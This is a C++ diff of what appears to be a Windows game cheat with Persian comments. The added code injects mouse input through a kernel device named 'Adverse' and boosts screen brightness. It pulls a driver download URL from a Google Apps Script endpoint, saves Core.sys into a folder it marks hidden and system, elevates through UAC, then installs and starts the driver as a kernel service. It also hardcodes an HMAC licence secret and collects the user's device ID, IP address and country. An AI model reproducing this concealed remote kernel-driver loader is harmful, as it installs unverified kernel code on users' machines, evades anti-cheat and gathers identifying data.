@@ -1,12 +1,11 @@
 #define _WIN32_WINNT 0x0A00 // Windows 10
 #include <windows.h>
-
-// اعلان تابع مخفی کردن DLL
-bool hide_interception_dll();
+#include <winioctl.h>
 #include <iostream> // Keep for logging to console/file
 #include <cstdio>   // For printf
 #include <cstdlib>  // For std::atexit
 #include <vector>
+#include <array>
 #include <string>
 #include <map>
 #include <cmath> // Needed for floor(), ceil()
@@ -21,7 +20,7 @@ bool hide_interception_dll();
 #include <iomanip> // For std::fixed and std::setprecision
 #include <ctime>   // For time formatting
 #include <shellapi.h> // For ShellExecute
-#include <atomic> // For g_is_logging_in
+#include <atomic> // For g_is_logging_in    
 #include <wininet.h> // For internet functions
 #include <mmsystem.h> // For PlaySound
 #include <iphlpapi.h> // For GetAdaptersInfo
@@ -41,16 +40,691 @@ bool hide_interception_dll();
 #include <shlobj.h> // For SHGetFolderPathA
 #include <tlhelp32.h> // For CreateToolhelp32Snapshot, Process32First, Process32Next
 #include <psapi.h> // For EnumProcessModules, GetModuleFileNameExA
-// --- هدر و کتابخانه Interception ---
-#include "interception.h" // مطمئن شوید این فایل در مسیر پروژه شما قرار دارد
-#include "interception_loader.h" // هدر جدید برای بارگذاری داخلی interception.dll
-#include "resource.h" // هدر منابع برای دسترسی به DLL داخلی
-#include "interception_functions.h" // هدر توابع جدید برای بارگذاری داخلی interception.dll
+#include <winsvc.h> // For service control manager APIs (driver install/start)
+#include "json.hpp" // For JSON parsing (Make sure the path is correct)
+#include "picosha2.h" // Include picosha2 for hashing
+
+enum class UINoticeLevel {
+    Info,
+    Warning,
+    Error
+};
+
+void set_ui_notice(UINoticeLevel level,
+                   const std::string& title,
+                   const std::string& message,
+                   const std::string& details = std::string());
+void clear_ui_notice();
+// --- Core.sys Mouse Driver (Adverse) ---
+#define IOCTL_MOUSE_MOVE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_MOUSE_MOVE_RAW 0x220444
+
+// Base license API endpoint (used for license and free trial checks)
+const char* LICENSE_API_BASE_URL = "https://script.google.com/macros/s/AKfycbwXP7s7ZYyIZnS-AEgntFsnc-BmpfvFsvJyTZsEbfuPN5lK5f20DNYFFUsEqEtK5eG7AA/exec";
+const char* STEAM_LOG_API_URL = "https://script.google.com/macros/s/AKfycbxjCs4E-Qcpt285DIMbmbCKnIWTAf4siSKxPCMu4KqO8EZk1b_P76oV9e6aWPbSwoqIjw/exec";
+const char* LICENSE_HMAC_SECRET = "7c2f9a4b1e8d6c5a0f3b2d7e9c1a4f8b6d0e3c9a5b7f1d2e8c4a6f0b9d3e1c7a";
+
+// Endpoint that returns the driver download URL as plain text when called with mode=driver_url
+const char* CORE_DRIVER_DOWNLOAD_URL = "https://script.google.com/macros/s/AKfycbwXP7s7ZYyIZnS-AEgntFsnc-BmpfvFsvJyTZsEbfuPN5lK5f20DNYFFUsEqEtK5eG7AA/exec?mode=driver_url";
+
+typedef struct _CORE_MOUSE_MOVE_INPUT {
+    LONG x;
+    LONG y;
+    USHORT flags;
+    USHORT padding;
+} CORE_MOUSE_MOVE_INPUT, *PCORE_MOUSE_MOVE_INPUT;
+
+class CoreMouseDriver {
+private:
+    HANDLE hDriver;
+
+public:
+    CoreMouseDriver() : hDriver(INVALID_HANDLE_VALUE) {}
+
+    ~CoreMouseDriver() {
+        Close();
+    }
+
+    bool Open() {
+        if (hDriver != INVALID_HANDLE_VALUE) {
+            return true;
+        }
+
+        hDriver = CreateFileW(
+            L"\\\\.\\Adverse",
+            GENERIC_READ | GENERIC_WRITE,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        );
+
+        if (hDriver == INVALID_HANDLE_VALUE) {
+            DWORD err = GetLastError();
+            std::cerr << "Failed to open mouse driver device (Adverse). Error: " << err << std::endl;
+            set_ui_notice(UINoticeLevel::Error,
+                          "Driver",
+                          "Driver device is not accessible. Run as Administrator and restart your PC if needed.",
+                          std::string("CreateFile(\\\\.\\\\Adverse) error: ") + std::to_string(err));
+            return false;
+        }
+
+        return true;
+    }
+
+    void Close() {
+        if (hDriver != INVALID_HANDLE_VALUE) {
+            CloseHandle(hDriver);
+            hDriver = INVALID_HANDLE_VALUE;
+        }
+    }
+
+    bool MoveMouse(LONG x, LONG y, USHORT buttonFlags = 0) {
+        if (hDriver == INVALID_HANDLE_VALUE) {
+            return false;
+        }
+
+        CORE_MOUSE_MOVE_INPUT input;
+        input.x = x;
+        input.y = y;
+        input.flags = buttonFlags;
+        input.padding = 0;
+
+        DWORD bytesReturned = 0;
+        BOOL result = DeviceIoControl(
+            hDriver,
+            IOCTL_MOUSE_MOVE_RAW,
+            &input,
+            sizeof(input),
+            NULL,
+            0,
+            &bytesReturned,
+            NULL
+        );
+
+        if (!result) {
+            DWORD error = GetLastError();
+            std::cerr << "DeviceIoControl (Core mouse driver) failed. Error: " << error << std::endl;
+            return false;
+        }
+
+        return true;
+    }
+
+    bool IsOpen() const {
+        return hDriver != INVALID_HANDLE_VALUE;
+    }
+};
+
+static CoreMouseDriver g_coreMouseDriver;
+static std::once_flag g_core_mouse_init_flag;
+
+// اعلان تابع لاگ قبل از استفاده در Helperها
+void output_log_message(const std::string& message);
+
+void send_webhook_via_google_script(const std::string& full_url, const std::string& token, const std::string& message);
+
+// --- Admin and Core.sys driver installation helpers ---
+
+bool IsRunningAsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = nullptr;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+
+    if (AllocateAndInitializeSid(
+            &ntAuthority,
+            2,
+            SECURITY_BUILTIN_DOMAIN_RID,
+            DOMAIN_ALIAS_RID_ADMINS,
+            0, 0, 0, 0, 0, 0,
+            &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+
+    return isAdmin == TRUE;
+}
+
+bool RelaunchAsAdmin() {
+    wchar_t exePath[MAX_PATH];
+    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+        std::cerr << "GetModuleFileNameW failed when trying to relaunch as admin. Error: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    SHELLEXECUTEINFOW sei{};
+    sei.cbSize = sizeof(sei);
+    sei.fMask = SEE_MASK_DEFAULT;
+    sei.hwnd = NULL;
+    sei.lpVerb = L"runas"; // Triggers UAC elevation prompt
+    sei.lpFile = exePath;
+    sei.nShow = SW_SHOWNORMAL;
+
+    if (!ShellExecuteExW(&sei)) {
+        DWORD err = GetLastError();
+        std::cerr << "ShellExecuteExW for elevation failed. Error: " << err << std::endl;
+        return false;
+    }
+
+    return true;
+}
+
+std::wstring GetExecutableDirectoryW() {
+    wchar_t exePath[MAX_PATH];
+    DWORD len = GetModuleFileNameW(NULL, exePath, MAX_PATH);
+    if (len == 0 || len >= MAX_PATH) {
+        return L"";
+    }
+
+    std::wstring path(exePath, len);
+    size_t pos = path.find_last_of(L"\\/");
+    if (pos != std::wstring::npos) {
+        path.resize(pos);
+    }
+    return path;
+}
+
+bool FileExistsW(const std::wstring& path) {
+    DWORD attrs = GetFileAttributesW(path.c_str());
+    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+bool FileExistsA(const std::string& path) {
+    DWORD attrs = GetFileAttributesA(path.c_str());
+    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+std::wstring GetCoreDriverHiddenPath() {
+    wchar_t programDataPath[MAX_PATH];
+    if (SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, programDataPath) != S_OK) {
+        return L"";
+    }
+
+    std::wstring dir(programDataPath);
+    dir += L"\\Drivers"; 
+    CreateDirectoryW(dir.c_str(), NULL);
+    SetFileAttributesW(dir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+
+    return dir + L"\\Core.sys";
+}
+
+// Helper to fetch textual content from a URL (used to retrieve the actual driver download URL)
+std::string HttpGetToString(const char* url) {
+    std::string result;
+
+    HINTERNET hInternet = InternetOpenA("CoreDriverClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        return result;
+    }
+
+    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hUrl) {
+        InternetCloseHandle(hInternet);
+        return result;
+    }
+
+    char buffer[4096];
+    DWORD bytesRead = 0;
+    BOOL readOk = FALSE;
+
+    while (true) {
+        readOk = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
+        if (!readOk || bytesRead == 0) {
+            break;
+        }
+
+        result.append(buffer, bytesRead);
+    }
+
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+
+    return result;
+}
+
+bool HttpPostJsonToString(const std::string& url,
+                          const std::string& json_body,
+                          std::string& out_response,
+                          std::string& out_error,
+                          DWORD timeout_ms = 8000) {
+    out_response.clear();
+    out_error.clear();
+
+    HINTERNET hInternet = InternetOpenA(" Core Client", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) {
+        out_error = "InternetOpen failed.";
+        return false;
+    }
+
+    if (timeout_ms > 0) {
+        InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
+        InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
+        InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
+    }
+
+    URL_COMPONENTSA url_comp;
+    ZeroMemory(&url_comp, sizeof(url_comp));
+    url_comp.dwStructSize = sizeof(url_comp);
+    url_comp.dwHostNameLength = 1;
+    url_comp.dwUrlPathLength = 1;
+
+    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.length(), 0, &url_comp)) {
+        out_error = "InternetCrackUrl failed.";
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    std::vector<char> host_name(url_comp.dwHostNameLength + 1);
+    std::vector<char> url_path(url_comp.dwUrlPathLength + 1);
+    url_comp.lpszHostName = host_name.data();
+    url_comp.lpszUrlPath = url_path.data();
+    url_comp.dwHostNameLength++;
+    url_comp.dwUrlPathLength++;
+
+    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.length(), 0, &url_comp)) {
+        out_error = "InternetCrackUrl failed (buffers).";
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    HINTERNET hConnect = InternetConnectA(hInternet,
+                                          url_comp.lpszHostName,
+                                          url_comp.nPort,
+                                          NULL,
+                                          NULL,
+                                          INTERNET_SERVICE_HTTP,
+                                          0,
+                                          0);
+    if (!hConnect) {
+        out_error = "InternetConnect failed.";
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
+    if (url_comp.nScheme == INTERNET_SCHEME_HTTPS) {
+        flags |= INTERNET_FLAG_SECURE;
+    }
+
+    HINTERNET hRequest = HttpOpenRequestA(hConnect,
+                                          "POST",
+                                          url_comp.lpszUrlPath,
+                                          NULL,
+                                          NULL,
+                                          NULL,
+                                          flags,
+                                          0);
+    if (!hRequest) {
+        out_error = "HttpOpenRequest failed.";
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    std::string headers = "Content-Type: application/json\r\n";
+
+    if (!HttpSendRequestA(hRequest,
+                          headers.c_str(),
+                          (DWORD)headers.length(),
+                          (LPVOID)json_body.data(),
+                          (DWORD)json_body.size())) {
+        out_error = "HttpSendRequest failed. Error: " + std::to_string(GetLastError());
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    char buffer[4096];
+    DWORD bytes_read = 0;
+    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
+        buffer[bytes_read] = '\0';
+        out_response.append(buffer);
+    }
+
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    if (out_response.empty()) {
+        out_error = "Empty response from server.";
+        return false;
+    }
+
+    return true;
+}
+
+bool DownloadFileToPath(const char* url, const std::wstring& destPath) {
+    {
+        std::string urlStr = (url ? std::string(url) : std::string(""));
+        std::string destUtf8(destPath.begin(), destPath.end());
+        output_log_message("[Driver] DownloadFileToPath called. URL: " + urlStr + " Dest: " + destUtf8 + "\n");
+    }
+    HINTERNET hInternet = InternetOpenA("CoreDriverClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        output_log_message("[Driver] DownloadFileToPath failed: InternetOpenA failed. Error: " + std::to_string(GetLastError()) + "\n");
+        return false;
+    }
+
+    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hUrl) {
+        output_log_message("[Driver] DownloadFileToPath failed: InternetOpenUrlA failed. Error: " + std::to_string(GetLastError()) + "\n");
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    HANDLE hFile = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        output_log_message("[Driver] DownloadFileToPath failed: CreateFileW failed. Error: " + std::to_string(GetLastError()) + "\n");
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    BYTE buffer[4096];
+    DWORD bytesRead = 0;
+    BOOL readOk = FALSE;
+
+    while (true) {
+        readOk = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
+        if (!readOk || bytesRead == 0) {
+            break;
+        }
+
+        DWORD bytesWritten = 0;
+        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
+            output_log_message("[Driver] DownloadFileToPath failed: WriteFile failed. Error: " + std::to_string(GetLastError()) + "\n");
+            CloseHandle(hFile);
+            InternetCloseHandle(hUrl);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+    }
+
+    CloseHandle(hFile);
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+
+    bool exists = FileExistsW(destPath);
+    output_log_message(std::string("[Driver] DownloadFileToPath finished. Exists: ") + (exists ? "true" : "false") + "\n");
+    return exists;
+}
+
+bool InstallAndStartCoreDriver(const std::wstring& serviceName,
+                               const std::wstring& driverPath) {
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+    if (!hSCM) {
+        DWORD err = GetLastError();
+        std::cerr << "OpenSCManagerW failed. Error: " << err << std::endl;
+        set_ui_notice(UINoticeLevel::Error,
+                      "Driver",
+                      "Could not access Service Control Manager. Run as Administrator.",
+                      std::string("OpenSCManagerW error: ") + std::to_string(err));
+        return false;
+    }
+
+    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
+    if (!hService) {
+        DWORD openErr = GetLastError();
+        if (openErr != ERROR_SERVICE_DOES_NOT_EXIST) {
+            std::cerr << "OpenServiceW for driver service failed. Error: " << openErr << std::endl;
+            set_ui_notice(UINoticeLevel::Error,
+                          "Driver",
+                          "Could not open driver service. Run as Administrator.",
+                          std::string("OpenServiceW error: ") + std::to_string(openErr));
+            CloseServiceHandle(hSCM);
+            return false;
+        }
+
+        // Service does not exist yet, create it
+        hService = CreateServiceW(
+            hSCM,
+            serviceName.c_str(),
+            serviceName.c_str(),
+            SERVICE_ALL_ACCESS,
+            SERVICE_KERNEL_DRIVER,
+            SERVICE_DEMAND_START,
+            SERVICE_ERROR_NORMAL,
+            driverPath.c_str(),
+            nullptr, nullptr, nullptr, nullptr, nullptr
+        );
+
+        if (!hService) {
+            DWORD err = GetLastError();
+            std::cerr << "CreateServiceW for driver service failed. Error: " << err << std::endl;
+            set_ui_notice(UINoticeLevel::Error,
+                          "Driver",
+                          "Could not create driver service. Run as Administrator.",
+                          std::string("CreateServiceW error: ") + std::to_string(err));
+            CloseServiceHandle(hSCM);
+            return false;
+        }
+    } else {
+        // Service exists already (possibly from an older version). Make sure the binary path points to our driver.
+        DWORD bytesNeeded = 0;
+        QueryServiceConfigW(hService, nullptr, 0, &bytesNeeded);
+        if (bytesNeeded > 0) {
+            std::vector<BYTE> buf(bytesNeeded);
+            QUERY_SERVICE_CONFIGW* cfg = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(buf.data());
+            if (QueryServiceConfigW(hService, cfg, bytesNeeded, &bytesNeeded)) {
+                if (cfg->lpBinaryPathName && _wcsicmp(cfg->lpBinaryPathName, driverPath.c_str()) != 0) {
+                    {
+                        std::string oldPath(cfg->lpBinaryPathName, cfg->lpBinaryPathName + wcslen(cfg->lpBinaryPathName));
+                        std::string newPath(driverPath.begin(), driverPath.end());
+                        output_log_message("[Driver] Existing service ImagePath differs. Updating. Old: " + oldPath + " New: " + newPath + "\n");
+                    }
+                    BOOL changed = ChangeServiceConfigW(
+                        hService,
+                        SERVICE_NO_CHANGE,
+                        SERVICE_NO_CHANGE,
+                        SERVICE_NO_CHANGE,
+                        driverPath.c_str(),
+                        nullptr,
+                        nullptr,
+                        nullptr,
+                        nullptr,
+                        nullptr,
+                        nullptr
+                    );
+                    if (!changed) {
+                        DWORD err = GetLastError();
+                        std::wcerr << L"ChangeServiceConfigW failed to update driver ImagePath. Error: " << err
+                                   << L" (existing: " << cfg->lpBinaryPathName << L", desired: " << driverPath << L")"
+                                   << std::endl;
+                        set_ui_notice(UINoticeLevel::Error,
+                                      "Driver",
+                                      "Could not update driver service path.",
+                                      std::string("ChangeServiceConfigW error: ") + std::to_string(err));
+                        CloseServiceHandle(hService);
+                        CloseServiceHandle(hSCM);
+                        return false;
+                    }
+
+                    {
+                        std::string newPath(driverPath.begin(), driverPath.end());
+                        output_log_message("[Driver] Service ImagePath updated successfully. New: " + newPath + "\n");
+                    }
+                }
+            } else {
+                DWORD err = GetLastError();
+                output_log_message(std::string("[Driver] QueryServiceConfigW failed while checking existing service. Error: ") + std::to_string(err) + "\n");
+            }
+        }
+    }
+
+    BOOL started = StartServiceW(hService, 0, nullptr);
+    if (!started) {
+        DWORD err = GetLastError();
+        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
+            std::cerr << "StartServiceW for driver service failed. Error: " << err << std::endl;
+            set_ui_notice(UINoticeLevel::Error,
+                          "Driver",
+                          "Driver could not be started. Restart PC and run as Administrator.",
+                          std::string("StartServiceW error: ") + std::to_string(err));
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            return false;
+        }
+    }
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+    return true;
+}
+
+bool EnsureCoreDriverInstalledAndStarted() {
+    // First, probe whether the device is already accessible.
+    // If so, we treat the driver as already installed and running.
+    CoreMouseDriver probe;
+    if (probe.Open()) {
+        probe.Close();
+        std::cerr << "Core.sys driver already accessible via \\ \\.\\Adverse. Skipping installation." << std::endl;
+        output_log_message("[CoreDriver] Core.sys device \\.\u00005CAdverse already accessible. Skipping installation.\n");
+        return true;
+    }
+
+    // Determine hidden ProgramData path for the driver
+    std::wstring hiddenDriverPath = GetCoreDriverHiddenPath();
+    if (hiddenDriverPath.empty()) {
+        std::cerr << "Failed to determine hidden ProgramData path for driver file." << std::endl;
+        output_log_message("[Driver] Failed to determine hidden ProgramData path for driver file.\n");
+        return false;
+    }
+
+    {
+        std::string utf8Hidden(hiddenDriverPath.begin(), hiddenDriverPath.end());
+        output_log_message("[Driver] Hidden driver path: " + utf8Hidden + "\n");
+    }
+
+    bool driverExistsInHidden = FileExistsW(hiddenDriverPath);
+    output_log_message(std::string("[Driver] Driver exists in hidden path: ") + (driverExistsInHidden ? "true" : "false") + "\n");
+    if (!driverExistsInHidden) {
+        std::cerr << "Driver file not found in hidden ProgramData path. Attempting to retrieve driver URL from server." << std::endl;
+        output_log_message("[Driver] Driver file not found in hidden ProgramData path. Attempting to retrieve driver URL from server.\n");
+
+        output_log_message(std::string("[Driver] CORE_DRIVER_DOWNLOAD_URL endpoint: ") + std::string(CORE_DRIVER_DOWNLOAD_URL) + "\n");
+
+        // First, get the actual driver download URL as plain text from the server
+        std::string driverUrlText = HttpGetToString(CORE_DRIVER_DOWNLOAD_URL);
+
+        // Trim whitespace/newlines from the received URL
+        auto trim = [](std::string& s) {
+            const char* ws = " \t\r\n";
+            size_t start = s.find_first_not_of(ws);
+            size_t end   = s.find_last_not_of(ws);
+            if (start == std::string::npos || end == std::string::npos) {
+                s.clear();
+                return;
+            }
+            s = s.substr(start, end - start + 1);
+        };
+
+        trim(driverUrlText);
+
+        output_log_message(std::string("[Driver] Retrieved driver download URL (trimmed): ") + driverUrlText + "\n");
+
+        if (driverUrlText.empty()) {
+            std::cerr << "Failed to retrieve driver URL from server (empty response)." << std::endl;
+            output_log_message("[Driver] Failed to retrieve driver URL from server (empty response).\n");
+            set_ui_notice(UINoticeLevel::Error,
+                          "Driver",
+                          "Could not get driver download link. Check your internet / firewall and try again.",
+                          std::string("Endpoint: ") + std::string(CORE_DRIVER_DOWNLOAD_URL));
+        } else {
+            std::cerr << "Retrieved driver URL from server, attempting download." << std::endl;
+            output_log_message("[Driver] Retrieved driver URL from server, attempting download.\n");
+
+            {
+                std::string utf8Hidden(hiddenDriverPath.begin(), hiddenDriverPath.end());
+                output_log_message("[Driver] Attempting download to hidden path: " + utf8Hidden + "\n");
+            }
+
+            if (!DownloadFileToPath(driverUrlText.c_str(), hiddenDriverPath)) {
+                std::cerr << "DownloadFileToPath(driverUrl) failed." << std::endl;
+                output_log_message("[Driver] DownloadFileToPath(driverUrl) FAILED.\n");
+                set_ui_notice(UINoticeLevel::Error,
+                              "Driver",
+                              "Driver download failed. Check internet/antivirus and try again.",
+                              std::string("URL: ") + driverUrlText);
+            } else {
+                driverExistsInHidden = FileExistsW(hiddenDriverPath);
+                output_log_message(std::string("[Driver] After download, driver exists in hidden path: ") + (driverExistsInHidden ? "true" : "false") + "\n");
+            }
+        }
+    }
+
+    // Compatibility/debug: also check for Core.sys next to the executable
+    std::wstring exeDir = GetExecutableDirectoryW();
+    std::wstring exeDriverPath;
+    if (!exeDir.empty()) {
+        exeDriverPath = exeDir + L"\\Core.sys";
+    }
+
+    bool driverExistsNextToExe = (!exeDriverPath.empty() && FileExistsW(exeDriverPath));
+
+    if (!exeDriverPath.empty()) {
+        std::string utf8Exe(exeDriverPath.begin(), exeDriverPath.end());
+        output_log_message("[Driver] EXE-adjacent driver path: " + utf8Exe + " Exists: " + (driverExistsNextToExe ? std::string("true") : std::string("false")) + "\n");
+    }
+
+    // If hidden path is still missing but the driver exists next to the executable, try to copy it
+    if (!driverExistsInHidden && driverExistsNextToExe) {
+        std::cerr << "Driver file found next to executable. Copying to hidden ProgramData path." << std::endl;
+        output_log_message("[Driver] Driver file found next to executable. Copying to hidden ProgramData path.\n");
+
+        if (CopyFileW(exeDriverPath.c_str(), hiddenDriverPath.c_str(), FALSE)) {
+            driverExistsInHidden = true;
+        } else {
+            std::cerr << "CopyFileW from exe directory to hidden path failed. Using exe path directly." << std::endl;
+            output_log_message("[Driver] CopyFileW from exe directory to hidden path FAILED. Using exe path directly.\n");
+        }
+    }
+
+    // Decide which path to use for service installation
+    std::wstring driverPathForService;
+    if (driverExistsInHidden) {
+        driverPathForService = hiddenDriverPath;
+    } else if (driverExistsNextToExe) {
+        driverPathForService = exeDriverPath;
+        std::string utf8Path(driverPathForService.begin(), driverPathForService.end());
+        std::cerr << "Using driver file next to executable as fallback. Path: " << utf8Path << std::endl;
+        output_log_message("[Driver] Using driver file next to executable as fallback. Path: " + utf8Path + "\n");
+    } else {
+        std::cerr << "Driver file not found in any known location after download attempts." << std::endl;
+        output_log_message("[Driver] Driver file not found in any known location after download attempts.\n");
+        set_ui_notice(UINoticeLevel::Error,
+                      "Driver",
+                      "Driver file was not found. Please reinstall or place Core.sys next to the executable.",
+                      "Expected: C:\\ProgramData\\Drivers\\Core.sys");
+        return false;
+    }
+
+    const std::wstring serviceName = L"Core"; // Kernel driver service name for Core.sys
+    if (!InstallAndStartCoreDriver(serviceName, driverPathForService)) {
+        std::string utf8Path(driverPathForService.begin(), driverPathForService.end());
+        std::cerr << "InstallAndStartCoreDriver(driver) failed. Path: " << utf8Path << std::endl;
+        output_log_message("[Driver] InstallAndStartCoreDriver(driver) FAILED. Path: " + utf8Path + "\n");
+        set_ui_notice(UINoticeLevel::Error,
+                      "Driver",
+                      "Driver installation/start failed. Some features may not work.",
+                      std::string("Driver path: ") + utf8Path);
+        return false;
+    }
+
+    std::string utf8FinalPath(driverPathForService.begin(), driverPathForService.end());
+    std::cerr << "Driver installed/started successfully. Path: " << utf8FinalPath << std::endl;
+    output_log_message("[Driver] Driver service installed/started successfully. Path: " + utf8FinalPath + "\n");
+    return true;
+}
 
 // Forward declarations
 // ... 
+
+#ifdef _MSC_VER
 #pragma comment(lib, "winmm.lib") // Link against winmm.lib for PlaySound (MSVC specific)
 #pragma comment(lib, "wininet.lib") // Link against wininet.lib for HTTP requests (MSVC specific)
+#endif
 
 // Gamma Control Globals & Functions
 // For GetDC, ReleaseDC, GetDeviceGammaRamp, SetDeviceGammaRamp (requires wingdi.h, usually pulled by windows.h)
@@ -86,9 +760,12 @@ void InitializeGammaControls() {
                 for (int i = 0; i < 256; ++i) {
                     double normalized_input = i / 255.0;
                     double corrected_value = pow(normalized_input, boost_gamma_value);
-                    g_boostedGammaRamp[channel][i] = (WORD)(corrected_value * 65535.0);
+                    double scaled_value = corrected_value * 65535.0;
+                    if (scaled_value > 65535.0) scaled_value = 65535.0;
+                    if (scaled_value < 0.0) scaled_value = 0.0;
+                    g_boostedGammaRamp[channel][i] = (WORD)(scaled_value);
                     // Clamp to ensure it's within WORD range, though pow(0..1, positive_gamma) should yield 0..1
-                    if (g_boostedGammaRamp[channel][i] > 0xFFFF) g_boostedGammaRamp[channel][i] = 0xFFFF;
+                    // (Clamping is done on scaled_value before casting.)
                 }
             }
             printf("Boosted gamma ramp created (using gamma curve, factor: %.2f - Increased Brightness).\n", boost_gamma_value);
@@ -225,13 +902,15 @@ void ApplyCurrentGammaRamp() {
         printf("Error: GetDC(desktopWindow) failed. Cannot apply gamma ramp.\n");
     }
 }
-static bool g_endKeyPressedLastFrame = false; // For End key state
+[[maybe_unused]] static bool g_endKeyPressedLastFrame = false; // For End key state
 // End Gamma Control Globals & Functions
 
+#ifdef _MSC_VER
 #pragma comment(lib, "iphlpapi.lib") // Link against iphlpapi.lib for MAC address (MSVC specific)
 #pragma comment(lib, "d3d11.lib") // Link against d3d11.lib (MSVC specific)
 #pragma comment(lib, "dwmapi.lib") // Link against dwmapi.lib (for MSVC)
 #pragma comment(lib, "dxgi.lib") // Link against dxgi.lib for GPU info
+#endif
 
 // کلاس مدیریت پنجره برای بهبود عملکرد مخفی/نمایش
 class WindowManager {
@@ -295,12 +974,10 @@ HWND WindowManager::s_hWnd = NULL;
 std::atomic<bool> WindowManager::s_isVisible(true);
 std::atomic<bool> WindowManager::s_needsRebuild(false);
 std::chrono::steady_clock::time_point WindowManager::s_lastToggleTime = std::chrono::steady_clock::now();
+#ifdef _MSC_VER
 #pragma comment(lib, "advapi32.lib") // Link library for registry functions
 #pragma comment(lib, "psapi.lib") // Link library for EnumProcessModules
-
-#include "json.hpp" // For JSON parsing (Make sure the path is correct)
-#include "picosha2.h" // Include picosha2 for hashing
-
+#endif
 // اعلان توابع مورد نیاز برای ارسال لاگ‌های امنیتی
 // این اعلان‌ها باید قبل از تعریف تابع send_security_log_to_api باشند
 
@@ -312,6 +989,53 @@ void output_log_message(const std::string& message);
 std::string generate_device_id();
 extern const std::string APP_VERSION_NUMBER;
 std::string get_user_ip(); // اعلان تابع get_user_ip
+
+
+
+std::once_flag g_device_id_once_flag;
+std::string g_cached_device_id;
+std::once_flag g_user_ip_once_flag;
+std::string g_cached_user_ip;
+
+std::once_flag g_user_country_once_flag;
+std::string g_cached_user_country;
+
+std::string get_cached_device_id() {
+    std::call_once(g_device_id_once_flag, []() {
+        g_cached_device_id = generate_device_id();
+    });
+    return g_cached_device_id;
+}
+
+std::string get_cached_user_ip() {
+    std::call_once(g_user_ip_once_flag, []() {
+        try {
+            g_cached_user_ip = get_user_ip();
+        } catch (...) {
+            g_cached_user_ip = "Unknown";
+        }
+        if (g_cached_user_ip.empty() || g_cached_user_ip == "unknown_ip") {
+            g_cached_user_ip = "Unknown";
+        }
+    });
+    return g_cached_user_ip;
+}
+
+std::string get_country_name_for_ip(const std::string& ip);
+
+std::string get_cached_user_country() {
+    std::call_once(g_user_country_once_flag, []() {
+        try {
+            g_cached_user_country = get_country_name_for_ip(get_cached_user_ip());
+        } catch (...) {
+            g_cached_user_country = "Unknown";
+        }
+        if (g_cached_user_country.empty()) {
+            g_cached_user_country = "Unknown";
+        }
+    });
+    return g_cached_user_country;
+}
 
 
 
@@ -356,12 +1080,228 @@ std::string url_encode(const std::string &value) {
     return escaped.str();
 }
 
+extern "C" BOOLEAN NTAPI SystemFunction036(PVOID RandomBuffer, ULONG RandomBufferLength);
+
+std::string bytes_to_hex(const std::vector<unsigned char>& bytes) {
